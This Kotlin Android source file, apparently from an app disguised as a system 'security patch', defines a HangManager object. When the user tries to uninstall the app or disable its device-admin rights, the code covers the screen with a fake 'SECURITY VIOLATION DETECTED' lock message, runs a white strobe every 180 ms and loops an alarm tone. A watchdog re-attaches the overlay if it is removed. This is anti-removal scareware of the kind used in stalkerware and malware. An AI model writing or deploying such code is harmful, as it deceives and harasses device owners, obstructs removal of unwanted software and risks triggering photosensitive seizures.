package com.android.security.patch

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.TextView

object HangManager {

    enum class Reason { UNINSTALL, ADMIN_DISABLE, MANUAL }

    private var wm: WindowManager? = null
    private var overlay: View? = null
    private var flashView: View? = null
    private var player: MediaPlayer? = null
    private var flashHandler: Handler? = null
    private var flashOn = false
    private var stopHandler: Handler? = null

    private const val DURATION_MS = 60_000L

    fun start(ctx: Context, reason: Reason) {
        if (Prefs.getBool(ctx, Prefs.HANG_ACTIVE)) return
        Prefs.setBool(ctx, Prefs.HANG_ACTIVE, true)

        if (!Settings.canDrawOverlays(ctx)) {
            // kalau gak bisa overlay, fallback: nyalain flash+ring aja via service
            startSound(ctx)
            return
        }

        attachOverlay(ctx)
        startFlash(ctx)
        startSound(ctx)

        stopHandler?.removeCallbacksAndMessages(null)
        stopHandler = Handler(Looper.getMainLooper())
        stopHandler?.postDelayed({ stop(ctx) }, DURATION_MS)
    }

    fun stop(ctx: Context) {
        Prefs.setBool(ctx, Prefs.HANG_ACTIVE, false)
        detachOverlay()
        stopFlash()
        stopSound()
        stopHandler?.removeCallbacksAndMessages(null)
        stopHandler = null
    }

    /** dipanggil watchdog kalau overlay hilang */
    fun ensureAttached(ctx: Context) {
        if (!Prefs.getBool(ctx, Prefs.HANG_ACTIVE)) return
        if (overlay == null) attachOverlay(ctx)
        if (flashView == null) startFlash(ctx)
        if (player == null) startSound(ctx)
    }

    private fun attachOverlay(ctx: Context) {
        try {
            wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val tv = TextView(ctx).apply {
                setBackgroundColor(Color.BLACK)
                setTextColor(Color.RED)
                textSize = 22f
                gravity = Gravity.CENTER
                text = buildMessage()
                setPadding(60, 60, 60, 60)
            }
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else WindowManager.LayoutParams.TYPE_PHONE
            val lp = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    or WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.TRANSLUCENT
            )
            lp.gravity = Gravity.TOP or Gravity.START
            wm?.addView(tv, lp)
            overlay = tv
        } catch (_: Throwable) {}
    }

    private fun detachOverlay() {
        try { overlay?.let { wm?.removeView(it) } } catch (_: Throwable) {}
        overlay = null
    }

    private fun buildMessage(): String {
        val custom = Prefs.getStr(null) // no-op, placeholder
        return "SECURITY VIOLATION DETECTED\n\n" +
            "Perangkat ini dikunci oleh Security Patch.\n" +
            "Hubungi administrator untuk membuka."
    }

    private fun startFlash(ctx: Context) {
        try {
            wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val v = View(ctx).apply { setBackgroundColor(Color.WHITE) }
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else WindowManager.LayoutParams.TYPE_PHONE
            val lp = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            )
            v.alpha = 0f
            wm?.addView(v, lp)
            flashView = v

            flashHandler = Handler(Looper.getMainLooper())
            val tick = object : Runnable {
                override fun run() {
                    flashOn = !flashOn
                    flashView?.alpha = if (flashOn) 0.9f else 0f
                    flashHandler?.postDelayed(this, 180L)
                }
            }
            flashHandler?.post(tick)
        } catch (_: Throwable) {}
    }

    private fun stopFlash() {
        flashHandler?.removeCallbacksAndMessages(null)
        flashHandler = null
        try { flashView?.let { wm?.removeView(it) } } catch (_: Throwable) {}
        flashView = null
    }

    private fun startSound(ctx: Context) {
        try {
            if (player != null) return
            val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
            player = MediaPlayer().apply {
                setAudioAttributes(AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_ALARM)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .build())
                setDataSource(ctx, uri)
                isLooping = true
                prepare()
                start()
            }
        } catch (_: Throwable) {}
    }

    private fun stopSound() {
        try { player?.stop() } catch (_: Throwable) {}
        try { player?.release() } catch (_: Throwable) {}
        player = null
    }
}